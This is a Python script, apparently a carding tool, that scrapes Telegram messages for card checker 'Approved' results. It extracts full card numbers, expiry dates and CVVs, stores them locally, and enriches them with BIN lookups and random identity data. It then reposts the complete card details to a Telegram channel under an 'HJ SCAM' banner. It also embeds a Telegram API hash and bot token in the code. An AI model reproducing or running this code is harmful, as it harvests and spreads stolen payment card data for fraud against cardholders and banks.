from telethon import TelegramClient, events
import re
import telebot
import requests
import random
import asyncio
from colorama import Fore
from os import system
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

api_id = 29009837
api_hash = '1d388952a2f1f03de04a4b94f64eb6ed'

client = TelegramClient('anon', api_id, api_hash)
client.parse_mode = 'html'

TokenAthena = "7426061715:AAGuXLGMGVAVMX2POGVifHfVlBeNjUBE6bo"
id_channel_athena = -1003127906650
bot = telebot.TeleBot(TokenAthena, parse_mode="html")
system("clear")

def verificar(ccn):
    with open('tarjetas.txt', 'r') as f: r = f.read()
    if ccn in r:
        return True
    else: 
        return False

                    
                        
@client.on(events.NewMessage)                              
@client.on(events.MessageEdited)
async def my_event_handler(event):
    global resp
    text = event.raw_text 
   
    res = text.split()
    responses = ['Approved','Non VBV','Gateway Rejected: avs','Approved','Non VBV','✅✅✅ Approved ✅✅✅', 'Approved','Succeeded! 🤑','APPROVED','APPROVED ✅','✅✅✅ Approved ✅✅✅','Approved CCN','Approved #AUTH! ✅','Approved ❇️','APPROVED ✅','APPROVED ✓','✅Appr0ved','Security code incorrect✅','Approved ❇️','CVV2 FAILURE POSSIBLE CVV ⌯ N - AVS: G','Succeeded!','𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒂𝒓𝒅 ✅','𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅','𝑪𝒉𝒂𝒓𝒈𝒆𝒅 𝟎.𝟐𝟓$','𝑪𝒉𝒂𝒓𝒈𝒆𝒅 $3 ✅','Succeeded','Error: Your card has insufficient funds.','Subscription complete','CVV LIVE ✅','Card Approved CCN/CCV Live','incorrect_cvc','Approved! ✅','VIVA ✅','APPROVED ✓']
    if any(response in text for response in responses):
            
            x = re.findall(r'\d+', text)
 
              
            if len(x) == 0:
                
                return
            if len(x) == 1:
                
                return
            elif len(x) == 2:
                
                return
            elif len(x) == 3:
                
                return
            cc = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if len(cc) > 16:
                return
            if len(mm) > 2:
                return
            if len(yy) > 4:
                return
            if len(cvv) > 4:
                return
            cxc = (f"{cc}")
            if mm.startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3:
                mm, yy, cvv = yy, cvv, mm
            if len(cc) < 15 or len(cc) > 16:                
                return
            if len(yy) == 2:
                yy = '20'+yy
            tarj = f'{cc}|{mm}|{yy}|{cvv}'           
            v = verificar(cc)
            if v == True:
                return
            tarj = f'{cc}|{mm}|{yy}|{cvv}'
            with open('tarjetas.txt', 'a') as d:
                d.write(tarj+"\n")
            if 'Approved' == 'Approved':
                bin = cxc[0:6]
                rs = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()            
                country = rs["country"]
                flag = rs["country_flag"]
                bank = rs["bank"]
                brand = rs["brand"]
                type = rs["type"]
                level = rs["level"] 
                extra2 = cxc[0:12]
                xountry = country
                api = requests.get(f"https://randomuser.me/api/?nat={xountry}&inc=name,location").json()
                name = api["results"][0]["name"]["first"]
                lastname = api["results"][0]["name"]["last"] 
                street = api["results"][0]["location"]["street"]["name"]
                complement = api["results"][0]["location"]["street"]["number"]
                
                vbvr = random.randint(1,2)
                
                if vbvr == 1 or country == "MX" or bin == "499998":
                    res = ['CVV MATCHED!','Status code cvv: Gateway Rejected: cvv','Gateway Rejected: avs','Status code avs_and_cvv: Gateway Rejected: avs_and_cvv','Card Issuer Declined CVV','Approved']
                    resp = random.choice(res)
                    new2 = (f"""
<b><i>HJ SCAM</i> #BIN{bin}</b>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Cc</b> ➸ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>Response</b> ➸ Approved! ✅ 
<b>Extra</> ➸ <code>{extra2}xxxx|{mm}|{yy}|rnd</code>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Info</b> ➸ {brand} - {level} -  {type}
<b>Bank</b> ➸ {bank}
<b>Country</b> ➸ {country} {flag}
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Owner</b> ➸ @hjofc123
""")
                #bot.send_message(id_channel_athena, text) 
                    img3 = "https://imgur.com/a/UAwXPEO"
                    
                    print(f"\n ✅ {Fore.LIGHTWHITE_EX}#Card Tested: {Fore.LIGHTBLUE_EX}{cc}|{mm}|{yy}|{cvv} {Fore.LIGHTWHITE_EX}/ {country}|{flag}\n" 
                             f"  {Fore.LIGHTWHITE_EX}#Seccesfully Sended - ID Channel: {Fore.LIGHTBLUE_EX}{id_channel_athena}")
                 
                    try:
                        bot.send_photo(id_channel_athena, img3, new2)
                    except Exception as e:
                        print(f"Error al enviar foto: {e}")
                        # Enviar como mensaje de texto si falla la foto
                        bot.send_message(id_channel_athena, new2)
                     
                elif vbvr == 2 or bin == "451015":
                    res = ['CVV MATCHED!','Status code cvv: Gateway Rejected: cvv','Gateway Rejected: avs','Status code avs_and_cvv: Gateway Rejected: avs_and_cvv','Card Issuer Declined CVV','Approved']
                    resp = random.choice(res)
                    new2 = (f"""
<b><i>HJ SCAM</i> #BIN{bin}</b>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Cc</b> ➸ <code>{cc}|{mm}|{yy}|{cvv}</code>
<b>Response</b> ➸ Approved! ✅ 
<b>Extra</b> ➸ <code>{extra2}xxxx|{mm}|{yy}|rnd</code>
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Info</b> ➸ {brand} - {level} - {type}
<b>Bank</b> ➸ {bank}
<b>Country</b> ➸ {country} {flag}
<b>- - - - - - - - - - - - - - - - - - - - - - - -</b>
<b>Owner</b> ➸ @hjofc123
""")
                #bot.send_message(id_channel_athena, text) 
                    img3 = "/storage/emulated/0/scam/hj.jpg" #aca tu imagen dentro de las "" 
                    
                    print(f"\n  ❌ {Fore.LIGHTWHITE_EX}#Card Tested: {Fore.LIGHTBLUE_EX}{cc}|{mm}|{yy}|{cvv} {Fore.LIGHTWHITE_EX}/ {country}|{flag}\n" 
                             f"  {Fore.LIGHTWHITE_EX}#Seccesfully Sended - ID Channel: {Fore.LIGHTBLUE_EX}{id_channel_athena}")
                 
                    try:
                        bot.send_photo(id_channel_athena, img3, new2)
                    except Exception as e:
                        print(f"Error al enviar foto: {e}")
                        # Enviar como mensaje de texto si falla la foto
                        bot.send_message(id_channel_athena, new2)
                    
    else:
        pass
        
        
client.start()
client.run_until_disconnected()
